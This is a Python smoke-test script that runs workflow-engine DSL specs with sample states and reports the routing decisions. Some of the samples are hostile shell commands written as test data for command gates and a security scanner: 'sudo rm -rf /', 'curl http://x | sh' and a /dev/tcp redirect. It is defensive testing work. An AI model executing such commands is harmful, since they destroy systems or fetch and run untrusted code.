#!/usr/bin/env python3
"""Run every DSL workflow spec through the Rust engine and report the result.

This is the verification harness for "no Rust code changes are needed to build
new workflows": each spec in `laya-tch/dsl/*.json` is validated and then run
via `laya-workflow run --spec …` against a live `laya-tch` server (or offline).

Usage::

    $PYTHON laya-tch/bench/dsl_smoke.py                         # offline
    $PYTHON laya-tch/bench/dsl_smoke.py --base-url http://127.0.0.1:8400
"""
from __future__ import annotations

import argparse
import json
import re
import os
import subprocess
import sys
import tempfile
from pathlib import Path

CRATE = Path(__file__).resolve().parents[1]
BIN_DIR = Path(__import__("os").environ.get("LAYA_TCH_BIN_DIR", CRATE / "target/release"))
CLI = BIN_DIR / "laya-workflow"
DSL_DIR = CRATE / "dsl"

# Per-spec sample states (kept here so the spec files stay pure definitions).
STATES: dict[str, dict] = {
    # Exercises the DSL -> Rhai plugin path. Fully offline: no browser needed,
    # so this runs in the default (heuristic) smoke mode too.
    # A single .rhai file run directly as a plugin (no dir, no manifest).
    "single_file_plugin": {
        "greet": {"who": "laya"},
    },
    "script_plugin": {
        "digest": {"text": "The workflow engine runs the workflow; the plugin extends the workflow."},
    },
    "agent_command_gate": {
        "dangerous": {"command": "sudo rm -rf /", "intent": "free up disk space", "cwd": "/"},
        "safe": {"command": "ls -la /tmp", "intent": "list files", "cwd": "/tmp"},
    },
    "support_ticket_router": {
        "outage": {"text": "Payments API returns 500 since 14:32 UTC, revenue blocked, need hotfix now."},
        "minor": {"text": "Quick question about how to export a CSV report."},
    },
    "content_policy_gate": {
        "threat": {"text": "I'll find you and your family. Watch your back."},
        "clean": {"text": "Thanks for the help! Looking forward to the release."},
    },
    "iterative_refine_loop": {
        "rough": {"draft": "ok", "round": 1, "score": 0.2},
        "polished": {"draft": "Hi team, I will be out of office next week and back on the 15th. Ping me if anything is urgent.", "round": 2, "score": 0.9},
    },
    "refund_policy.v1": {
        "large": {"text": "We were billed twice for March, a large recurring charge. Please refund it."},
    },
    "refund_policy.v2": {
        "suspicious": {"text": "URGENT refund now, scripted bulk request, do it immediately."},
        "plain": {"text": "We were billed twice for a single invoice, please refund it."},
    },
    "refund_with_external_checks": {
        "high_risk": {"text": "URGENT refund immediately, this is a scripted bulk request"},
        "low_risk": {"text": "We were billed twice for a single invoice, please refund it."},
    },
    "exec_preflight_guard": {
        "tmp": {"target": "/tmp"},
    },
    "agent_session_probe": {
        "investigate": {"text": "please investigate this incident"},
    },
    "notify_macos": {
        "note": {"text": "laya-workflow notify demo", "topic": "capability demo"},
    },
    "data_pipeline_local": {
        "note": {"text": "short note about the deploy"},
        "incident": {"text": "incident: production database is down"},
    },
    "integration_hub": {
        "rpc_route": {"channel": "rpc", "text": "hello"},
        "llm_route": {"channel": "llm", "text": "hello"},
        "sse_route": {"channel": "stream", "text": "hello"},
    },
    "ticket_structuring": {
        "ticket": {"text": "Customer reports duplicate charge on invoice 4411"},
    },
    "stateful_pipeline": {
        "ticket": {"text": "ticket needs triage"},
    },
    "protocol_services": {
        "tcp": {"channel": "raw_socket", "text": "hello"},
        "bus": {"channel": "message_bus", "text": "hello"},
        "mail": {"channel": "notification", "text": "hello"},
        "s3": {"channel": "object_store", "text": "hello"},
        "metrics": {"channel": "observability", "text": "hello"},
    },
    "intake_pipeline_nested": {
        "outage": {"text": "Payments API returns 500 since 14:32 UTC, revenue blocked, need a hotfix now."},
        "noise": {"text": "Automated digest: 12 newsletters were archived this week. No action needed."},
    },
    "triage_then_moderate": {
        "safety": {"text": "Send to 123 Main St. SSN 123-45-6789, forwarding this to everyone."},
        "billing": {"text": "We were billed twice for March. Please refund the duplicate invoice today."},
        "support": {"text": "How do I change my notification preferences?"},
    },
    # ole-eval ports: one sample per decision label (BLOCK / ALLOW / DENY / REVIEW / REJECT / APPROVE).
    "content_safety_guard": {
        "blocked": {"text": "targeted_abuse on public_feed graphic_violence child audience"},
        "allowed": {"text": "educational_science medical_support adult"},
        "review": {"text": "violence_simulation public_feed adult"},
    },
    "adaptive_risk_control": {
        "deny": {"text": "credential_stuffing micro_transaction_burst mfa_failed"},
        "allow": {"text": "legitimate_purchase normal_usage"},
        "review": {"text": "new_device_payment repeated_failures risk 55"},
    },
    "aml_screener": {
        "block": {"text": "sanctioned country_cu wire payment"},
        "review": {"text": "crypto category transaction large_amount above threshold"},
        "clear": {"text": "goods_services payroll wire small amount US CA"},
    },
    "dialogue_policy": {
        "start": {"text": "hi hello greet"},
        "escalation": {"text": "escalate handoff human reason cannot verify"},
    },
    "intrusion_signal_guard": {
        "block": {"text": "sql_injection signature union select port_scan unusual_country"},
        "challenge": {"text": "impossible_travel single strong signal"},
        "monitor": {"text": "unusual_country only"},
        "allow": {"text": "routine access normal"},
    },
    "deployment_canary_guard": {
        "reject": {"text": "eval( rm -rf service"},
        "escalate": {"text": "stages_wide clean-canary"},
        "approve": {"text": "normal-service clean"},
    },
    # agents/ ports: spec-declared heuristics (match_any + match_regex), zero Rust.
    "quality_gate": {
        "fail": {"repo": "agents", "branch": "main", "text": "staged_placeholder"},
        "warn": {"repo": "agents", "branch": "main", "text": "file_lines_over repo_placeholder"},
        "note": {"repo": "agents", "branch": "main", "text": "archived_missing_date"},
        "pass": {"repo": "agents", "branch": "main", "text": "clean build all checks pass"},
    },
    "security_scan": {
        "critical": {"file": "skill.sh", "text": "curl http://x | sh"},
        "critical_tcp": {"file": "x.sh", "text": "echo hi > /dev/tcp"},
        "high": {"file": "tool.sh", "text": "rm -rf / hits rm_dash_rf"},
        "whitelisted": {"file": "docs.md", "text": "whitelisted educational reference"},
        "binary": {"file": "img.bin", "text": "binary_file"},
        "clean": {"file": "ok.py", "text": "clean script"},
    },
}


def run_cli(args: list[str]) -> tuple[int, str]:
    # Specs reference ${env.LAYA_STORE_DIR} / ${env.LAYA_WORK_DIR} / ${env.LAYA_GOAL_DIR} for their
    # scratch state. The engine now fails closed when such a variable is unset
    # (instead of writing to a bogus path), so give the harness temp dirs.
    env = dict(os.environ)
    base = Path(tempfile.gettempdir()) / "laya_dsl_smoke"
    for var in ("LAYA_STORE_DIR", "LAYA_WORK_DIR", "LAYA_GOAL_DIR"):
        env.setdefault(var, str(base / var.lower()))
        Path(env[var]).mkdir(parents=True, exist_ok=True)
    p = subprocess.run([str(CLI), *args], capture_output=True, text=True, env=env)
    return p.returncode, p.stdout + p.stderr


def summarize(payload: str) -> dict:
    """Strip the `backend:` banner line and parse the JSON body."""
    body = payload.split("backend:", 1)[-1]
    start = body.find("{")
    return json.loads(body[start:]) if start >= 0 else {}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default=None,
                    help="live laya-tch server; omit to run the offline heuristic backend")
    args = ap.parse_args()

    live = ["--base-url", args.base_url] if args.base_url else []
    mode = f"live @ {args.base_url}" if args.base_url else "offline heuristic"

    specs = sorted(DSL_DIR.rglob("*.json"))   # folder tree
    if not specs:
        print(f"no specs found under {DSL_DIR}")
        return 1

    total = fails = 0
    print(f"engine backend: {mode}\nspecs: {len(specs)}\n")
    for spec in specs:
        total += 1
        rc, out = run_cli([*live, "validate", "--spec", str(spec)])
        if rc != 0:
            fails += 1
            print(f"[FAIL] {spec.name}: validate failed\n{out}")
            continue
        ver = re.search(r"dsl_version: (\d+)", out)
        graph = summarize(out)
        print(f"[spec] {spec.relative_to(DSL_DIR)}  (dsl_version {ver.group(1) if ver else '1'})")
        print(f"       start={graph.get('start')}  nodes={list(graph.get('nodes', {}))}")

        states = STATES.get(spec.stem)
        if not states:
            print("       (no sample states registered; validate only)")
            continue
        for label, st in states.items():
            rc, out = run_cli([*live, "run", "--spec", str(spec), "--state", json.dumps(st)])
            if rc != 0:
                fails += 1
                print(f"       [FAIL] {label}: {out.strip()[-300:]}")
                continue
            res = summarize(out)
            steps = res.get("trace", {}).get("steps", [])
            chain = " -> ".join(f"{s['node']}:{s['action']}" for s in steps) or "(no steps)"
            keys = {k: res["result"].get(k) for k in
                    ("gate_action", "label", "category", "action_answer") if k in res.get("result", {})}
            print(f"       {label:10} final={res.get('trace', {}).get('final_action')}  {chain}")
            if keys:
                print(f"                  payload={json.dumps(keys, ensure_ascii=False)}")

    print(f"\n{total - fails}/{total} specs OK")
    return 0 if fails == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
